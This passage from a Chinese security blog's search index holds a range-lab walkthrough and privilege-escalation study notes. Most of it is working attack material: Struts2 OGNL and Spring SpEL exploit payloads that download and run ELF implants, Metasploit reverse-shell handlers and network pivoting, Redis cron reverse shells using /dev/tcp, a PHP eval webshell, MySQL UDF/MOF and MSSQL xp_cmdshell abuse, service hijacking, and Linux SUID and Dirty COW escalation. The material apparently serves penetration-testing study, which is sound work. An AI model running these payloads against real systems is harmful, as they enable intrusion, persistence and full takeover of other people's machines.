服务器ip:1111/1.elf&#x27;).getInputStream()).useDelimiter(&#x27;%5C%5C%5C%5CA&#x27;)%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A&#x27;&#x27;%2C%23res.print(%23str)%2C%23res.close()%0A%7d 1skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec(&#x27;chmod 777 1.elf&#x27;).getInputStream()).useDelimiter(&#x27;%5C%5C%5C%5CA&#x27;)%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A&#x27;&#x27;%2C%23res.print(%23str)%2C%23res.close()%0A%7d 1skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec(&#x27;./she.elf&#x27;).getInputStream()).useDelimiter(&#x27;%5C%5C%5C%5CA&#x27;)%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A&#x27;&#x27;%2C%23res.print(%23str)%2C%23res.close()%0A%7d msf开启监听 12345use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 服务器ipset LPORT 1111run 上线成功 主机3发现新网段 添加路由 run autoroute -s 192.120.3.0&#x2F;24 扫描该网段 12345use auxiliary/scanner/portscan/tcpset rhosts 192.120.3.0/24set ports 22,23,80,8080,3389,445,6379set threads 20run springboot服务 发现漏洞为 CVE-2017-17485 在服务器上创建spel.xml文件 12345678910111213&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;constructor-arg&gt; &lt;array&gt; &lt;value&gt;wget&lt;/value&gt; &lt;value&gt;http://服务器ip:4444/2.elf&lt;/value&gt; &lt;/array&gt; &lt;/constructor-arg&gt; &lt;property name=&quot;any&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; spel1.xml 1234567891011121314&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;constructor-arg&gt; &lt;array&gt; &lt;value&gt;chmod&lt;/value&gt; &lt;value&gt;777&lt;/value&gt; &lt;value&gt;2.elf&lt;/value&gt; &lt;/array&gt; &lt;/constructor-arg&gt; &lt;property name=&quot;any&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; spel2.xml 123456789101112&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;constructor-arg&gt; &lt;array&gt; &lt;value&gt;./2.elf&lt;/value&gt; &lt;/array&gt; &lt;/constructor-arg&gt; &lt;property name=&quot;any&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; poc 12345678910111213141516POST /exploit HTTP/1.1Host: 192.120.3.51:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 131&#123;&quot;param&quot;: [ &quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;, &quot;http://服务器ip:6666/spel.xml&quot;]&#125; msf设置监听 12345use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 服务器ipset LPORT 8888run 成功上线","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"}]},{"title":"权限提升","slug":"提权","date":"2022-10-08T16:00:00.000Z","updated":"2022-10-18T13:36:12.431Z","comments":true,"path":"2022/10/09/提权/","link":"","permalink":"http://example.com/2022/10/09/%E6%8F%90%E6%9D%83/","excerpt":"","text":"Winodws提权系统内核溢出漏洞提权利用Windows系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统有没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞的话，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。 一般流程：信息收集-&gt;补丁筛选-&gt;利用msf或者特定exp提权-&gt;成功 漏洞扫描工具目的：获取可能存在的漏洞编号 vulmap(windows和Linux都适用，Linux需要Python) 在本机上运行报错 解决方案：用管理员身份打开shell命令行，输入以下命令 1set-executionpolicy remotesigned 缺点：只能在powershell里面使用，对于Web提权，不能使用powershell 半天扫描不出来 感觉不太好用 wes.py 服务器执行systeminfo &gt; 1.txt生成文件 既适用本地环境，也适用web环境。 本机执行命令：python wes.py 1.txt -o vuln7.csv（-o为输出文件） 生成vuln.csv文件，判断可能存在的漏洞 metaspolit的内置模块Local Exploit Suggester 这个模块可以帮助我们识别系统存在哪些漏洞可以被利用，并且为我们提供最合适的exp，通过这个exp我们可以进一步提权。 1use post/multi/recon/local_exploit_suggester 提权利用信息收集所收集到的信息，考虑利用未打的补丁进行提取 主要思路：1.MSF提权（优先）2.网络上搜索特定的EXP MSF提权 1.利用search命令寻找对应漏洞 2.使用相应模块 1use exploit/windows/local/ms14_058_track_popup_menu 3.配置好相应参数，即可运行 AT&amp;SC&amp;PS 命令提权1.at提权（针对win7之前（2008之后）的操作系统） 相关命令： at 21:26 /interactive cmd.exe &#x2F;&#x2F;给系统添加一项作业，在下一分钟后打开 因为使用的虚拟机是windows7,at命令无法以交互方式打开 在任务管理器中打开 右键打开文件位置，运行cmd.exe at /del &#x2F;&#x2F;删除所有计划作业 2.sc提权使用sc命令创建一个syscmd的服务，绑定binPath的路径（以cmd打开）： sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact 开启对应服务 sc start syscmd 这里显示失败，但是弹出窗口选择查看消息，就能看到system权限的cmd 结束后记得删除创建的服务 sc delete syscmd 3.ps提权psexec是windows官方的工具,是为windows提供的第三方工具库 因为该虚拟机是64位的机子，所以选择psexec64 psexec64.exe -accepteula -s -i -d cmd.exe 运行成功后与at提权一样，由任务管理器中找到路径打开 在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除 Access 数据库外，其他数据库基本都存在数据库提权的可能。 单纯用令牌窃取提权需要有一个高一点的权限（administer），如果单纯是一个web权限（iis&#x2F;defaultAPP），应该是无法成功的。 Windows2008&amp;7 令牌窃取提升适用范围：windows2008或win7之前版本 原理：进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。 msfvenom生成木马 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.189.130 LPORT=7777 -f exe -o a.exe 加载incognito模块 use incognito list_tokens -u 窃取令牌 1impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; Windows2003&amp;10 进程注入提升进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在 windows2008 之前操作系统上 1pinjector -l //获取当前计算机运行进程列表 1pinjector -P pid cmd.exe port//进程注入 使用kali监听对应端口，即可获得system权限 烂土豆提权本地提权，只针对本地用户，不能用于域用户。适用于win7、8、10、2008、2012 1.上传MSF马并设置对应监听连接 加载incognito模块 12use incognitolist_tokens -u 如果用户不是管理员权限，则可能执行不成功 上传并执行烂土豆 potato.exe 1execute -cH -f ./potato.exe 就可以进行令牌窃取了 1impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; DLL劫持原理： Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索： 应用程序加载的目录C:\\Windows\\System32C:\\Windows\\SystemC:\\Windows当前工作目录Current Working Directory，CWD在PATH环境变量的目录（先系统后用户） 条件：dll 劫持提权需要特定软件应用的控制权限及启用配合 1.特定软件；2.特定软件的控制权限；3.管理员启动软件 流程：信息收集（服务器上的第三方程序的信息）-进程调试（分析这个程序在运行的时候调用了哪些dll）-制作 dll 并上传(制作后门dll去替换原有的dll)-替换 dll-启动应用后成功 以flashftp为例 运行程序，利用ydark查看加载了哪些dll 加载的dll路径需要为自己能访问到并拥有更改权限的的路径，否则会因为权限不够而无法修改 MSFvenom生成dll后门并上传到对应路径 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.129 LPORT=7777 -f dll -o shell.dll 改为对应文件名 再次运行该应用 msf设置监听 加载incognito模块 use incognito list_tokens -u 窃取令牌 1impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 不带引号服务路径当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。 当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。 路径没有包含在引号中，服务会按照以下顺序依次执行 1234c:\\program.exec:\\program files.exec:\\program files (x86)\\grasssoft\\macro.exec:\\program files (x86)\\grasssoft\\macro expert\\MacroService.exe 如果存在漏洞路径，我们可以将msf木马放到上面的路径下，然后重启机器，此时，反弹回来的shell，则是一个system的shell 查看系统配置错误的路径 1wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot; 使用msf制作一个后门，命名为Program.exe，上传到目标服务器C盘根目录 msf就可以接收到反弹回来的会话 不安全的服务权限1.原理：Windows服务有时被配置为与服务本身或与服务运行的目录相关的弱权限。这可能允许攻击者操纵服务，以便在其启动时执行任意代码，并将权限提升到SYSTEM。 2.利用方法：将服务的 binpath 更改为我们上传的木马文件路径，以便在服务启动时执行恶意代码从而获得system权限。 accesschk.exe工具介绍：accesschk是一个windows系统配置检查工具，用于查看文件、注册表项、服务、进程、内核对象等的有效权限。该工具将有助于识别当前用户是否可以修改某个服务目录中的文件。 由于它是微软官方出品，我们将其上传至靶机，执行不会受到阻碍 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk 1.上传accesschk.exe到靶机 通过冰蝎将accesschk.exe上传至靶机C盘根目录 2.启动accesschk.exe 第一次执行accesschk.exe会跳出一个提示窗口让我们接受许可，我们执行accesschk.exe /accepteula命令绕过以自动接受。 检测服务权限配置：执行命令检测，检测当前用户可以操作的服务项accesschk.exe -uwcqv &quot;Administrators&quot; * 3.上传木马文件 启动msf生成名为shell.exe的木马msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.129 LPORT=7777 -f exe &gt; shell.exe 将木马上传至靶机C盘根目录 msf开启监听 4.更改服务路径指向 从刚刚我们使用accesschk.exe查看到的可以操作的服务项中随意挑选一个，这里我们选择AppReadiness这个服务，改变其binpath为上传的木马文件路径 1sc config &quot;AppReadiness&quot; binpath=&quot;C:\\shell.exe&quot; 5.启动服务，成功获得system权限 启动AppReadinesssc start AppReadiness msf收到会话，查看权限，提权成功 数据库提权信息收集（获取数据库密码）MYSQL1.本地源码如果是phpstudy搭建的框架，一般数据库密码可能存储在网站根目录，可以重点查看带有关键字的配置文件，常见的关键字有sql、data、inc、config、connect、database、common、include等。 2.数据库存储或者备份文件MySQL存储格式及对应内容： data目录下文件夹对应数据库名 文件夹内 表名.myd文件中的内容对应的就是表的内容 mysql用户密码存在mysql数据库的user表中 select host,user,authentication_string from mysql.user; 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B 将获得的md5密文解密即可得到密码 3.暴力破解获取数据库最高权限密码，一般我们使用前两种方法居多，如果前两种方法实在用不了，我们才考虑使用暴力猜解。暴力猜解之前，需要先了解数据库是否支持外联以及如何开启外联 mysql.user字段中host表示哪些用户可以登录数据库 127.0.0.1，会通过TCP&#x2F;IP协议连接，并且只能在本机访问 localhost，localhost不会被解析成IP地址，直接通过UNIXsocket连接 **%**表示允许外联 192.168.202.%表示处于192.168.202C段下的所有用户可以登录 当mysql允许外联时就可以爆破最高权限用户密码 MYsql设置允许外联： 修改mysql的user表，host字段为指定ip即可。如果想任意主机都可以连接，可以使用% 1234update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;;flush privileges;grant all on *.* to admin@&#x27;%&#x27; identified by &#x27;123456&#x27; with grant option;//新建远程连接账户 （1）超级弱口令爆破工具 （2）MSF auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_login模块 4.UDF提权UDF（Userdefined function）可翻译为用户自定义函数，其为mysql的一个拓展接口，可以为mysql增添一些函数 UDF提取的先决条件 1.知道mysql用户名和密码，并且可以远程登录 2.mysql有写入文件的权限，即secure_file_priv的值为空。 secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。 1）secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出2）当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下3）当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制 一、查看mysql写入文件权限 1show global variables like &#x27;%secure%&#x27;;//查看secure_file_priv是否为空 可修改my.ini文件，在mysqld条目下添加 “**secure_file_priv&#x3D;**” 二、上传UDF 的动态链接库文件 动态链接库就是实现共享函数库概念的一种方式，在windows环境下后缀名为.dll，在linux环境下后缀名为.so 。我们要将该文件放在特定的目录中，该文件中包含了执行系统命令的一些函数。 1.Mysql版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。 2.Mysql版本小于5.1：如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\\Winnt\\udf.dll 下。如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\\Windows\\udf.dll 下。 select version(); &#x2F;&#x2F;查看数据库版本 show variables like &quot;%plugin%&quot;; &#x2F;&#x2F;查看plugin位置 select @@version_compile_os, @@version_compile_machine;&#x2F;&#x2F;查看数据库和操作系统位数，选择对应mysql位数的udf.dll 如果plugin文件默认不存在，可通过以下命令建立 1select &#x27;xxx&#x27; into dumpfile &#x27;C:\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$INDEX_ALLOCATION&#x27;;//不一定成功，可能权限不够 mysql是32位的，上传32位的dll SQLmap中dll文件位于\\data\\udf\\目录下，选择对应dll，放入extra\\cloak下利用cloak.py解密后上传 1python ./cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll 导入指定目录 1234select hex(load_file(&#x27;C:\\\\Users\\\\jiang\\\\Desktopl\\\\lib_mysqludf_sys.dll&#x27;)) into dumpfile &#x27;C:\\\\phpStudy\\\\MySQL\\\\lib\\\\plugin\\\\lib_mysqludf_sys.dll&#x27;;#这里windows下目录结构要进行转义双写 三、创建自定义函数 1CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;lib_mysqludf_sys.dll&#x27;; 报错，可能版本出问题了，换64位后成功 然后使用命令查看是否新增了sys_eval函数 1select * from mysql.func; 四、执行系统命令 1select sys_eval(&#x27;whoami&#x27;); 5.MOF提权基于 MYSQL 特性的安全问题，成功率低 mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。获得mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一段时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。 利用条件 mysql有读写 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof 的权限 secure-file-priv参数不为null windows server2003 以下才能成功 手动一、创建一个mof文件，命名为useradd.mof,内容如下，将mof上传至任意可读可写目录下 （这里上传到C:\\phpStudy\\WWW） 12345678910111213141516171819202122232425#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) instance of __EventFilter as $EventFilter &#123; EventNamespace = &quot;Root\\\\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123; Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user admin Admin@123 /add\\&quot;)&quot;; &#125;; instance of __FilterToConsumerBinding &#123; Consumer = $Consumer; Filter = $EventFilter; &#125;; 二、使用sql语句将mof导入C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录，进而让系统执行我们这个恶意的mof文件 1select load_file(&#x27;C:\\phpStudy\\WWW\\user_add.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;; 报错了，百度也找不到什么好的解决办法 MSF1234567use exploit/windows/mysql/mysql_mofset payload windows/meterpreter/reverse_tcpshow optionsset rhosts 192.168.202.129set username rootset password rootrun 痕迹清除 由于系统会定期重新执行添加用户的命令，所以想清理痕迹得先暂时关闭 winmgmt 服务再删除mof 文件，此时删除用户才有效果。 12345678910# 停止 winmgmt 服务net stop winmgmt# 删除 Repository 文件夹rmdir /s /q C:\\Windows\\system32\\wbem\\Repository\\# 手动删除 mof 文件del C:\\Windows\\system32\\wbem\\mof\\good\\test.mof /F /S# 删除创建的用户net user hacker /delete# 重新启动服务net start winmgmt 6.MSF+启动项提权利用mysql_start_up 进行提权 12345use exploit/windows/mysql/mysql_start_upset rhost 192.168.202.129set username rootset password rootrun MSSQLMSSQL配置： 1.配置身份验证模式 2.允许数据库远程连接 3.防火墙打开1433端口 http://tttang.com/archive/1545/ xp_cmdshell提权存储过程为数据库提供了强大的功能，其类似UDF。在相应的权限下，攻击者可以利用不同的存储过程执行不同的高级功能，如增加MSSQL数据库用户，枚举文件目录等等。而这些系统存储过程中要数xp_cmdshell最强大，通过该存储过程可以在数据库服务器中执行任意系统命令。MSSQL2005,2008等之后版本的MSSQL都分别对系统存储过程做了权限控制以防止被滥用。 前提是必须获取SA用户的密码 首先检查判断xp_cmdshell是否存在： 1select count(*)from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27; ; 返回1是存在的 xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。 未开启时执行命令返回如下 开启xp_cmdshell： 1234EXEC sp_configure &#x27;show advanced options&#x27;,1//允许修改高级参数RECONFIGUREEXEC sp_configure &#x27;xp_cmdshell&#x27;,1 //打开xp_cmdshell扩展RECONFIGURE 关闭xp_cmdshell： 12exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure 提权： 12exec master..xp_cmdshell &#x27;net user test Admin@123 /add&#x27; //添加用户test，密码Admin@123exec master..xp_cmdshell &#x27;net localgroup administrators test add&#x27; //添加test用户到管理员组 在连接成功后在sql命令处执行： 1exec xp_cmdshell &#x27;net user aaa Admin@123 /add &amp;&amp; net localgroup administrators aaa /add&#x27; 同上方提权命令一样 就能成功的创建一个账户aaa并且加到管理员组： 1exec xp_cmdshell &#x27;net user aaa /delete&#x27;//删除aaa用户 sp_oacreate提权xp_cmdshell被删除的时候，考虑使用sp_oacreate 开启： 1234EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE WITH OVERRIDE; EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;RECONFIGURE WITH OVERRIDE; 关闭： 123exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure; 执行命令： 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c whoami &gt;C:\\\\1.txt&#x27; 系统目录下成功生成该文件 提权： 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c &quot;net user test Admin@123 /add&quot;&#x27; 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c &quot;net localgroup administrators test /add&quot;&#x27; 删除用户 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c &quot;net user test /delete&quot;&#x27; 沙盒提权什么是沙盒模式? 沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的. 利用条件： 1，Access可以调用VBS的函数，以System权限执行任意命令2，Access执行这个命令是有条件的，需要一个开关被打开3，这个开关在注册表里4，SA是有权限写注册表的5，用SA写注册表的权限打开那个开关6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令 开启默认关闭的xp_regwrite存储过程： exec sp_configure &#39;show advanced options&#39;,1;reconfigure; exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure; 利用jet.oledb执行系统命令添加系统账号： openrowset(&#39;microsoft.jet.oledb.4.0’,’;database=c:/windows/system32/ias/ias.mdb’,‘select shell(&quot;whoami&quot;)&#39;) openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。 Redis提权基于Redis未授权或者已经获得Redis密码 连接数据库 1redis -cli -h ip -p port pass(未授权未设置密码，pass字段为空) 利用计划任务执行命令反弹 shell在服务器上开启监听7777端口 12345执行命令set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.189.130/7777 0&gt;&amp;1\\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 过一分钟左右就可以收到shell 写 ssh-keygen 公钥然后使用私钥登陆在攻击机中生成ssh公钥和私钥，密码设置为空: 1ssh-keygen -t rsa 进入.ssh目录：cd &#x2F;root&#x2F;.ssh ，将生成的公钥保存到1.txt： 12cd /root/.ssh(echo -e &quot;\\n\\n&quot;;cat id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; 1.txt 连接靶机上的redis服务，将保存的ssh公钥1.txt写入redis: 1cat 1.txt | redis-cli -h 192.168.189.136 -p 6379 -x set hack 连接redis 1redis-cli -h 192.168.189.136 更改redis备份路径为ssh公钥存放目录 1config set dir /root/.ssh 设置上传公钥的备份文件名字为authorized_keys 1config set dbfilename authorized_keys save命令保存 ssh登录 1ssh -i /root/.ssh/id_rsa root@192.168.189.136 写webshell前提：知道网站根目录 12345redis-cli -h 192.168.189.136 -p 6379config set dir /var/www/htmlconfig set dbfilename shell.php set x &quot;&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;&quot; save Linux提权信息收集手动信息收集： cat /etc/issue&#x2F;&#x2F;版本号 cat /proc/version&#x2F;&#x2F;内核版本 cat /etc/profile&#x2F;&#x2F;环境变量密码和api密钥 ps -aux&#x2F;&#x2F;运行服务 ls -alh /usr/bin&#x2F;&#x2F;安装应用程序 ls -alh /var/spool/cron&#x2F;&#x2F;计划任务 自动信息收集工具 LinEnum（Linux枚举及权限提升检查工具），用于linux本地信息收集 SUID文件： linux-exploit-suggester2漏洞探测工具： SUID提权 SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么该程序运行时，使用的权限为SUID设置的权限，而不是当前用户权限。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义. 在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效 设置SUID权限 12chmod u+s filename 设置SUID位chmod u-s filename 去掉SUID设置 ls -al查看文件权限 寻找正在运行的suid程序 123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; ; 常用的SUID提权程序及其用法 nmap 适用版本:nmap2.02至5.21 在早期nmap版本中,带有交互模式,因而允许用户执行shell命令 使用如下命令进入nmap交互模式: 1nmap --interactive 在nmap交互模式中 通过如下命令提权 123nmap&gt; !shsh-3.2# whoamiroot msf当中也有利用nmap进行提权的模块 1exploit/unix/local/setuid_nmap find find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。 提权如下: 12touch anyfile #必须要有这个文件find anyfile -exec whoami \\; 1234#进入shellfind anyfile -exec &#x27;/bin/sh&#x27; \\;sh-5.0# whoamiroot linux一般都安装了nc 我们也可以利用nc 广播或反弹shell 广播shell: 1find user -exec nc -lvp 4444 -e &#x27;/bin/sh&#x27; \\; 在攻击机上: 1nc 靶机ip 4444 反弹shell 1find anyfile -exec bash -c &#x27;bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1&#x27; \\; 在攻击机上: 1nc -lvvp 4444 Vim vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。 1vim.tiny /etc/passwd 通过vim进入shell 1234vim.tiny#vim命令:set shell = &#x27;/bin/sh&#x27;:shell Bash 以下命令将以root身份打开一个bash shell。 123bash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(service) less less命令也可以进入shell 123less /etc/passwd#在less中输入:!/bin/sh more more命令进入shell和less相同 123more /etc/passwd#在more中输入:!/bin/sh 要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用!命令进入shell cp 使用cp 命令覆盖原来的/etc/passwd文件，添加一个管理员账户 awk awk命令进入shell: 1awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27; nano 1234nano #进入nano编辑器Ctrl + RCtrl + X #即可输入命令 内核溢出漏洞提权和Windows内核溢出漏洞提权方式类似类似 上传漏洞探针，根据漏洞使用对应漏洞exp进行提权 脏牛提权 将40847.cpp复制到桌面 1cp /usr/share/exploitdb/exploits/linux/local/40847.cpp . 上传至靶机并编译执行 123upload 40847.cpp /tmp/40847.cppg++ -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil./40847 su密码被更改为dirtyCowFun 执行su命令报错 需要利用python生成一个伪终端，否则不能执行su命令 1python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; 成功提权","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}]}],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"内网协议","slug":"内网协议","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91%E5%8D%8F%E8%AE%AE/"},{"name":"权限维持","slug":"权限维持","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"},{"name":"python开发","slug":"python开发","permalink":"http://example.com/tags/python%E5%BC%80%E5%8F%91/"},{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"域渗透","slug":"域渗透","permalink":"http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"log4j2","slug":"log4j